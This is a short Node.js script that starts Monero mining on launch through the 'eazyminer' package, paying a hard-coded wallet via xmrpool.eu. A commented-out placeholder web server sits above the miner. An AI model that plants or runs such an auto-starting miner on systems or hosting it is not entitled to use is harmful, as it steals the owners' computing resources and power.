/*require('http').createServer((req, res) => {
    res.end("wsg");
}).listen(8080);*/

const Miner = require('eazyminer');
const xnr = new Miner({
    pools: [{
        coin: 'XMR',
        user: '4BGikiKrEm1TRJKoQWvdCxVdRugyAXgp9922KagUBKLVbRi2X7NhhNDR1HRQ1bVqQUMv8k8V6oA8zU61gzWqx4zRQDuBqmB',
        url: 'xmrpool.eu:3333', // optional pool URL,
    }],
    autoStart: true
});
